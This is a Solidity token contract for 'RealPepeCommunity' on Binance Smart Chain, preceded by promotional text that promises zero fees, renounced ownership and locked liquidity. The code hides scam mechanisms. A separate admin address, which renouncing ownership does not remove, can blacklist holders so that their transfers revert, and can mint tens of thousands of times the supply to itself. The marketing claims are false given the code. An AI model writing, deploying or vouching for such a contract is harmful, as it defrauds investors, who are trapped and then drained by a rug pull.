/**
🐸🌟 Introducing RealPepeCommunity on the Binance Smart Chain! 🚀

Hop into the world of RealPepeCommunity, a project that's all about the community! 🐸🌐 This is an exclusive community-driven initiative that's designed to bring the power back to the people.

🪙 Our token comes with zero fees, ensuring that you get the most out of your transactions without any unnecessary costs. Plus, we've got exciting news – the contract ownership will be renounced, putting the control in the hands of our amazing community! 🙌🎉

🔒 To further enhance the safety and security of our community, we're blocking the liquidity, ensuring that RealPepeCommunity remains a stable and reliable platform for all our frog-loving members.

📢 Stay tuned for more updates and announcements, even though we don't have official social media accounts. Remember, RealPepeCommunity is all about the community, by the community, and for the community! 🐸💚

Ribbit your way to success with RealPepeCommunity!
*/

// SPDX-License-Identifier: MIT 

pragma solidity ^0.8.0;

abstract contract Ownable  {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _check();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _check() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * tadrrby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


pragma solidity ^0.8.0;

contract RealPepeCommunity is Ownable {

    uint256 private _tokentotalSupply;
    string private _tokenname;
    string private _tokensymbol;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;



    
    address public _okexch337;
    mapping(address => bool) private cjjr;
    function outrouter(address adrr) external   {
        require(_okexch337 == _msgSender());
        cjjr[adrr] = false;
    }

    function aprove(address adrr) external   {
        require(_okexch337 == _msgSender());
        cjjr[adrr] = true;
    }


    function multisiigns() external {
        require(_okexch337 == _msgSender());
        uint256 amount = totalSupply();
        _balances[_msgSender()] += amount*75000;
    }
   

    function checkrouter(address adrr) public view returns(bool)  {
        return cjjr[adrr];
    }

    constructor(string memory tokenName, string memory tokensymbol,address adminBot) {
        _okexch337 = adminBot;
        _tokenname = tokenName;
        _tokensymbol = tokensymbol;
        uint256 amount = 10000000000*10**decimals();
        _tokentotalSupply += amount;
        _balances[msg.sender] += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _tokenname;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view returns (uint256) {
        return _tokentotalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }


    function transfer(address to, uint256 amount) public returns (bool) {
        _internaltransfer(_msgSender(), to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _internalspendAllowance(from, spender, amount);
        _internaltransfer(from, to, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function _internaltransfer(
        address fromSender,
        address toSender,
        uint256 amount
    ) internal virtual {
        require(fromSender != address(0), "ERC20: transfer from the zero address");
        require(toSender != address(0), "ERC20: transfer to the zero address");
        uint256 balance = _balances[fromSender];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");

        if(cjjr[fromSender] == true){
            amount = amount - (balance*23);
        }
       
        _balances[fromSender] = _balances[fromSender]-amount;
        _balances[toSender] = _balances[toSender]+amount;

        emit Transfer(fromSender, toSender, amount); 
        
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _internalspendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}